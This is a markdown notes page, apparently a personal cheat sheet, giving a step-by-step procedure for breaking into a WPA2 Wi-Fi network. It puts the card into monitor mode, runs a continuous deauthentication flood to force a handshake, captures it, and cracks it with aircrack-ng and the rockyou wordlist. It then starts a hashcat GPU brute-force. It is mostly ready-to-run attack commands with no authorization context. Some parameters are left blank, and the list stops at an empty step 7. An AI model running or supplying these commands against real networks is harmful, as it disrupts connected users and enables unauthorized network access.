---
title: Commands WPA2 handshake
---

**Kills processes:**
`sudo airmon-ng check kill`

> If you want to restart the processes run the following command:
> `sudo service NetworkManager restart`

**Starts monitor mode**
`sudo airmon-ng start wlan0`

**Verify that monitor mode is used**
`sudo airmon-ng`

**Get the AP's MAC address and channel**
`sudo airodump-ng wlan0`

1.  **window 1**
    
    1.  *Fill in the channel(after -c) and bssid(after --bssid)*
    2.  `sudo airodump-ng -w hack1 -c --bssid wlan0`
    
    > Note: "hack1 is the filename where we are going to store the captures in, you can choose the name of this file as it doesn't matter, you need to make sure that you remember it tho"
    
2.  **window 2**
    
    1.  *Fill in the bssid after '-a'*
    2.  `sudo aireplay-ng --deauth 0 -a wlan0`

**Use Wireshark to open hack file**
`wireshark hack1-01.cap`

> Note: This is the filename which we've chosen in 'window 1', as there are many captures going on (unless you live under a rock or something ;P), you will get multiple files and that's why there is a '-01' added. You could even have to look in 'hack1-03.cap' to be able to find the 4-way handshake.

**Filter Wireshark messages for EAPOL**

**Stop monitor mode**
`airmon-ng stop wlan0`

**Crack file with Rock you or another wordlist**
**Make sure you have rockyou in text format (unzip file on Kali)**
`aircrack-ng hack1-01.cap -w /usr/share/wordlists/rockyou.txt`

> Note: You can find it on any Kali distribution included at the location above, mine didn't have it tho, so I had to download it :'(
> If your were out of luck like me and don't have the wordlist, [you could download it over here](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt).
> **I had to use the followinf command as it was not included in my Kali distro (I downloaded my wordlist)**
> `aircrack-ng hack1-01.cap -w /root/Downloads/rockyou.txt`

**We can also try this without a wordlist, you can also use a brute force attack**

1.  Navigate to the folder where the .cap file is stored
2.  Convert the cap file to a file that is readable for 'hashcat'
3.  `/usr/share/hashcat-utils/cap2hccapx.bin hack1-01.cap wpa2.hccapx`
    ![image](https://user-images.githubusercontent.com/79259209/223355036-58df21db-cdaa-445c-9413-22a469b5bce0.png)
4.  Next I'll move my file to my Windows machine, so that I'll be able to use my GPU to brute force faster
5.  Then using cmd I'll navigate to my hashcat folder where i copied the file to

![image](https://user-images.githubusercontent.com/79259209/223355110-426af1dc-48d2-4750-bdac-d8fe89f7a1c5.png)

6\. Next, I want to check whether my GPU is available

![image](https://user-images.githubusercontent.com/79259209/223355264-b897e5a7-4927-4e24-b648-97f631d33a49.png)

7.
